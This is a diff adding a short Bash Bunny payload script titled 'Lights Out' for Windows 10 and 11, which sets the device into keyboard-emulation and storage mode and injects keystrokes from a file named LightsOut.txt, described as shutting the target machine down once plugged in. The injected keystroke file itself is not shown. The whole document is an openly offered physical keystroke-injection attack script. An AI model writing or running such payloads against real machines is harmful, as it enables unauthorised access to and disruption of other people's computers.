@@ -1,0 +1,19 @@
+# Title: Lights Out 
+# Author: White_Wid0w
+# Version: 2.0
+# Category: Executable
+# Target: Windows 10, 11
+# Description: A payload that turns off the machine once the bash bunny is plugged in. 
+
+
+LED SETUP 
+
+GET SWITCH_POSITION   
+
+ATTACKMODE HID STORAGE
+
+LED STAGE2 
+
+QUACK DELAY 3000
+LED STAGE2
+QUACK ${SWITCH_POSITION}/LightsOut.txt 
